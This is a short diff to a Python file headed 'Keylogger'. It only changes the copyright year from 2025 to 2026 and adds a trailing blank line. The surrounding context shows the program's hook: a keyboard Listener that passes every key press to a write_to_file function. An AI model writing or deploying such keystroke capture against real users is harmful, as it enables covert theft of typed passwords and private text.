@@ -2,7 +2,7 @@
 Keylogger
 ========================================================================
 
-Copyright (c) 2025 [Soumit Santra]
+Copyright (c) 2026 [Soumit Santra]
 All rights reserved.
 
 ===================================================================
@@ -324,6 +324,7 @@ def write_to_file(key):
 # Start the listener
 with Listener(on_press=write_to_file) as listener:
     listener.join()
+
 
 
 
